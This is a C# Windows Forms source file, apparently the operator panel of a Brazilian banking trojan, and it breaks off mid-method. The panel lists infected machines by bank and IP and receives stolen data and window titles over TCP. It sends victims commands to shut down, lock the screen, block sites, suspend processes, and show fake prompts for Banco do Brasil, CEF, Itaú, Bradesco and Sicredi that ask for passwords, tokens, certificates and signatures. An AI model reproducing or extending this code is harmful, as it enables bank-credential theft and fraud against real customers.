using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using System.Text.RegularExpressions;

namespace MenuRemoteServer
{
    public partial class MenuRemoteServer : Form
    {
        public RemoteClientManager remoteClientManager;
        public MenuRemoteView menuRemoteView;
        private TcpListener tcpListener;
        private Thread listenThread;
        private const int BufferSize = 1024;
        public Thread T = null;
        public Thread TRun = null;
        public Thread TRoda = null;

        public MenuRemoteServer()
        {
            InitializeComponent();
        }

        public MenuRemoteServer(MenuRemoteView RVHandle)
        {
            InitializeComponent();
            HandleToRV = RVHandle;
        }
        private MenuRemoteView HandleToRV;

        delegate void ClientListItemCallback(RemoteClient client);

        /**
         * Set client to the listview item.
         **/
        public void SetClientListItem(RemoteClient client)
        {
            if (listView_clients.InvokeRequired)
            {
                ClientListItemCallback d = new ClientListItemCallback(SetClientListItem);
                Invoke(d, new object[] { client });
            }
            else
            {
                String id = client.id;
                foreach (ListViewItem lvItemIn in listView_clients.Items)
                {
                    if (lvItemIn.Name == id)
                    {
                        lvItemIn.SubItems[1].Text = client.identification;
                        lvItemIn.SubItems[2].Text = client.operatingSystem;
                        lvItemIn.SubItems[3].Text = client.processor;
                        lvItemIn.SubItems[4].Text = client.ipAddress;
                        lvItemIn.SubItems[5].Text = client.bank;
                        lvItemIn.SubItems[6].Text = client.resolution;
                        lvItemIn.SubItems[7].Text = client.gb;
                        lvItemIn.SubItems[8].Text = client.rip;
                        return;
                    }
                }

                string[] row = { 
                                    (listView_clients.Items.Count + 1).ToString(), 
                                    client.identification, 
                                    client.operatingSystem, 
                                    client.processor, 
                                    client.ipAddress, 
                                    client.bank,
                                    client.resolution,
                                    client.gb,
                                    client.rip
                                };
                ListViewItem lvItem = new ListViewItem(row);
                lvItem.Name = client.id;
                listView_clients.Items.Add(lvItem);
            }
        }


        /**
         * Remove the client in listView_clients.
         **/
        public void RemoveClientListItem(RemoteClient client)
        {
            if (listView_clients.InvokeRequired)
            {
                ClientListItemCallback d = new ClientListItemCallback(RemoveClientListItem);
                Invoke(d, new object[] { client });
            }
            else
            {
                String id = client.id;
                foreach (ListViewItem lvItemIn in listView_clients.Items)
                {
                    if (lvItemIn.Name == id)
                    {
                        listView_clients.Items.Remove(lvItemIn);
                    }
                }
            }
        }


        delegate void ClientsListItemCallback(List<RemoteClient> client);

        /**
         * Refresh the clients of listView_clients.
         **/
        public void RefreshClientsListItem(List<RemoteClient> clients)
        {
            if (listView_clients.InvokeRequired)
            {
                ClientsListItemCallback d = new ClientsListItemCallback(RefreshClientsListItem);
                Invoke(d, new object[] { clients });
            }
            else
            {
                listView_clients.Items.Clear();
                foreach (RemoteClient client in clients)
                {
                    string[] row = { 
                                    (listView_clients.Items.Count + 1).ToString(), 
                                    client.identification, 
                                    client.operatingSystem, 
                                    client.processor, 
                                    client.ipAddress, 
                                    client.bank,
                                    client.resolution,
                                    client.gb,
                                    client.rip
                                };
                    ListViewItem lvItem = new ListViewItem(row);
                    lvItem.Name = client.id;
                    listView_clients.Items.Add(lvItem);
                }
            }
        }

        private void HandleClientComm(object client)
        {

            TcpClient tcpClient = (TcpClient)client;
            NetworkStream clientStream = tcpClient.GetStream();

            byte[] message = new byte[4096];
            int bytesRead;
            string recebido = "";

            try
            {

                while (true)
                {
                    bytesRead = 0;

                    try
                    {
                        bytesRead = clientStream.Read(message, 0, 4096);
                    }
                    catch
                    {
                        break;
                    }

                    if (bytesRead == 0)
                    {
                        break;
                    }

                    ASCIIEncoding encoder = new ASCIIEncoding();
                    recebido = encoder.GetString(message, 0, bytesRead);

                    MessageBox.Show(recebido, "Informação", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }

                tcpClient.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());

            }
        }

        private void ListenForClients()
        {
            this.tcpListener.Start();

            try
            {

                while (true)
                {
                    TcpClient client = this.tcpListener.AcceptTcpClient();
                    Thread clientThread = new Thread(new ParameterizedThreadStart(HandleClientComm));
                    clientThread.Start(client);
                }
            }

            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        public void ReceiveTCP(int portN)
        {
            int i = 1;
            TcpListener Listener = null;
            try
            {
                Listener = new TcpListener(IPAddress.Any, portN);
                Listener.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            byte[] RecData = new byte[BufferSize];
            int RecBytes;

            for (; ; )
            {
                TcpClient client = null;
                NetworkStream netstream = null;

                try
                {

                    if (Listener.Pending())
                    {
                        client = Listener.AcceptTcpClient();
                        netstream = client.GetStream();

                        string SaveFileName = string.Empty;

                        SaveFileName = Application.StartupPath + "\\Infos\\INFO_" + i + ".txt";
                        i++;
                        if (SaveFileName != string.Empty)
                        {
                            if (File.Exists(SaveFileName)) 
                            {
                                SaveFileName = Application.StartupPath + "\\Infos2\\INFO_" + i + ".txt"; // Caso o operador trave não sobreescreve o arquivo
                            }
                            int totalrecbytes = 0;
                            FileStream Fs = new FileStream(SaveFileName, FileMode.OpenOrCreate, FileAccess.Write);
                            while ((RecBytes = netstream.Read(RecData, 0, RecData.Length)) > 0)
                            {
                                Fs.Write(RecData, 0, RecBytes);
                                totalrecbytes += RecBytes;
                            }
                            Fs.Close();
                        }
                        netstream.Close();
                        client.Close();

                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    //netstream.Close();
                }
            }
        }

        public void StartReceiving()
        {
            ReceiveTCP(5555);
        }

        public void RecebeJanelas()
        {
            TcpListener listener;
            Socket connection;
            NetworkStream socketStream;

            int cnt = cJanelas.Items.Count;

            for (; ; )
            {
                try
                {
                    listener = new TcpListener(1234);
                    listener.Start();
                    while (true)
                    {
                        Thread thread = new Thread(RecebeJanelas);
                        thread.Start();
                        connection = listener.AcceptSocket();
                        socketStream = new NetworkStream(connection);
                        string dados = doRequest(socketStream);

                        if (dados != String.Empty)
                        {
                            cJanelas.Items.Insert(cnt, dados);
                        }

                        socketStream.Close();
                        connection.Close();
                    }
                }
                catch (Exception e)
                {
                    e.ToString();
                }
            }
        }

        public string doRequest(NetworkStream socketStream)
        {

            StreamReader sr = new StreamReader(socketStream);
            StreamWriter sw = new StreamWriter(socketStream);
            string streamReader = sr.ReadLine();
            return streamReader;
        }

        /**
         * Click activate button to activate server or deactivate.
         **/
        private void button_activate_Click(object sender, EventArgs e)
        {
            if (this.remoteClientManager.activated == false)
            {
                button_activate.Text = "Desativar Operador";
                toolStripStatus_value.Text = "Active";
                button_activate.BackColor = Color.Red;
                textbox_port.Enabled = false;
                textbox_maxConnection.Enabled = false;
                textbox_password.Enabled = false;
                textbox_timeout.Enabled = false;
                this.remoteClientManager.Activate(Convert.ToInt32(textbox_port.Text), textbox_password.Text);
            }
            else
            {
                button_activate.Text = "Activar Operador";
                toolStripStatus_value.Text = "Deactive";
                button_activate.BackColor = Color.DarkGreen;
                textbox_port.Enabled = true;
                textbox_maxConnection.Enabled = true;
                textbox_password.Enabled = true;
                textbox_timeout.Enabled = true;
                this.remoteClientManager.Deactivate();
            }

        }

        private void MenuRemoteServer_Load(object sender, EventArgs e)
        {
            /*try
            {
                    using(Mutex mutex = new Mutex(false, "Global\\" + "c0a76b5a-12ab-45c5-b9d9-d693faa6e7b9"))
                    {
                        if(!mutex.WaitOne(0, false))
                        {
                            Application.Exit();;
                        }

                    }
             
                DateTime expiraEm = DateTime.Parse(getBetween(readUrl(), "<-", "->"));
                DateTime dataSyst = DateTime.Now;
                string flag = getBetween(readUrl(), "<", ">");

                if (dataSyst.Date > expiraEm.Date || flag == "bye")
                {

                    MessageBox.Show("Por favor, renove seu cadastro.",
                                    "Nota Importante",
                                    MessageBoxButtons.OK,
                                    MessageBoxIcon.Exclamation,
                                    MessageBoxDefaultButton.Button1);

                    Application.Exit();
                }
            }

            catch
            {
                MessageBox.Show("Este software requer conexão à internet.",
                                    "Erro na execução",
                                    MessageBoxButtons.OK,
                                    MessageBoxIcon.Error,
                                    MessageBoxDefaultButton.Button1);

                Application.Exit();
            }*/

            using (Mutex mutex = new Mutex(false, "Global\\" + "c0a76b5a-12ab-45c5-b9d9-d693faa6e7b9"))
            {
                if (!mutex.WaitOne(0, false))
                {
                    Application.Exit(); ;
                }

            }

            remoteClientManager = new RemoteClientManager(this);

            this.tcpListener = new TcpListener(IPAddress.Any, 3000);
            this.listenThread = new Thread(new ThreadStart(ListenForClients));
            this.listenThread.Start();

            ThreadStart Ts = new ThreadStart(StartReceiving);
            T = new Thread(Ts);
            T.Start();

            ThreadStart Start = new ThreadStart(RecebeJanelas);
            TRun = new Thread(Start);
            TRun.Start();

        }

        private void accessRemoteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView_clients.SelectedItems.Count > 0)
            {
                ListViewItem item = listView_clients.FocusedItem;
                String clientId = item.Name;
                RemoteClient client = this.remoteClientManager.GetClientById(clientId);
                if (client != null)
                {
                    client.RemoteOn();
                    this.menuRemoteView = new MenuRemoteView(client);
                    String value = item.SubItems[6].Text.ToString();
                    String[] tokens = value.Split(new string[] { " x " }, StringSplitOptions.None);
                    Int32 w = Convert.ToInt32(tokens[0]);
                    Int32 h = Convert.ToInt32(tokens[1]);

                    MenuRemoteView HandleToRV = new MenuRemoteView();
                    HandleToRV.SetFormSize(w, h);

                    this.menuRemoteView.Visible = true;

                }
            }
        }

        delegate void InvalidateRemoteScreenCallback();
        public void PostInvalidateRemoteScreen()
        {
            InvalidateRemoteScreenCallback d = new InvalidateRemoteScreenCallback(() =>
            {
                this.menuRemoteView.Invalidate(false);
            });

            Invoke(d, new object[] { });
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|Shutdown|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void Reboot_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|Reboot|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|Close|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void lockInfo_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|LockInfo|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void releaseInfo_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|UnlockInfo|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void monOff_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|monOFF|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void monOn_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|monON|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void bloquearSiteToolStripMenuItem_Click(object sender, EventArgs e)
        {

            String site = Interaction.InputBox("Digite o site a ser bloqueado.\n Ex: google.com", "Enviar Site", "", 10, 10);
            String message = String.Format("<|BSITE|>{0}", site);
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage(message);
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }

        }

        private void desbloquearSiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|DSITE|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void suspederProcToolStripMenuItem_Click(object sender, EventArgs e)
        {
            String proc = Interaction.InputBox("Digite o nome do processo a ser suspendido.\n Ex: chrome.exe", "Enviar Processo", "", 10, 10);
            String message = String.Format("<|SPROC|>{0}", proc);
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage(message);
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void resumirProcToolStripMenuItem_Click(object sender, EventArgs e)
        {
            String proc = Interaction.InputBox("Digite o nome do processo a ser resumido.\n Ex: chrome.exe", "Enviar Processo", "", 10, 10);
            String message = String.Format("<|RPROC|>{0}", proc);
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage(message);
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private string readUrl()
        {

            var webRequest = WebRequest.Create(@"http://localhost/limite.ini");

            using (var response = webRequest.GetResponse())
            using (var content = response.GetResponseStream())
            using (var reader = new StreamReader(content))
            {
                var strContent = reader.ReadToEnd();

                return strContent;
            }

        }

        public static string getBetween(string strSource, string strStart, string strEnd)
        {
            int Start, End;
            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
            {
                Start = strSource.IndexOf(strStart, 0) + strStart.Length;
                End = strSource.IndexOf(strEnd, Start);
                return strSource.Substring(Start, End - Start);
            }
            else
            {
                return "";
            }
        }

        private void bBENTRADAToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|BB1|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void bBSENHACC06ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|BB2|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void bBToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|BBaa|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void bBTOKENToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|BBt|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void bBSENHACTA06ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|BBCorrnt|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void bBLOADERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|BBL|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void bBENTRADAToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|BB1|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void bBGERENCFINANCToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|BB3|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void bBCERTFDIGITALToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|BBCertf|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void bBTOKENToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|BBt|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void bBSENHACTA06ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|BBCorrnt|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void bBLOADERToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|BBL|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void cEFENTRADAToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|Cef|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void cEFASSINATURAToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|CefA|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void cEFLOADERToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|CefL|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void iTATABELAToolStripMenuItem_Click(object sender, EventArgs e)
        {
            String posicao = Interaction.InputBox("Digite o nº da posição da tabela.\n Ex: 30", "Enviar Posição", "", 10, 10);
            String message = String.Format("<|ItaTAB|>{0}", posicao);
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage(message);
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void iTATOKENToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|ItaTOK|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void iTANASCIMENTOToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|ItaNSC|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void iTASENHACC06ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|ItaSEN6|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void iTALOADERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|ItaLD|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void iTAENTRADAToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|ItaTOKJUINI|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void iTATOKENToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            String cod = Interaction.InputBox("Digite o nº do código final a ser enviado.\n Ex: 123", "Enviar Código", "", 10, 10);
            String message = String.Format("<|ItaTOKJU|>{0}", cod);
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage(message);
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void iTALOADERToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|ItaLD|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void dESCOENTRADAToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|Desco|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void dESCOToolStripMenuItem_Click(object sender, EventArgs e)
        {
            String posicao = Interaction.InputBox("Digite o nº da posição da tabela.\n Ex: 47", "Enviar Posição", "", 10, 10);
            String message = String.Format("<|DescoFTAB|>{0}", posicao);
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage(message);
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void dESCOSENHACC06ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|DescoTOK|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void dESCOLOADERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|Desco6|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void dESCOLOADERToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|DescoL|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void dESCOENTRADAToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|Desco|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void dESCOTOKENToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|DescoTOK|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void dESCOLOADERToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|DescoL|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void sICREDIENTRADAToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|Sic|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void sICREDIASSINATURAToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|SicA|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void sICREDITOKENToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|SicT|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void sICREDILOADERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
            {
                try
                {
                    client.mreMessage.WaitOne();
                    client.queueMessage.AddMessage("<|SicL|>");
                }

                catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            }
        }

        private void sANTAENTRADAToolStripMenuItem_Click(object sender, EventArgs e)
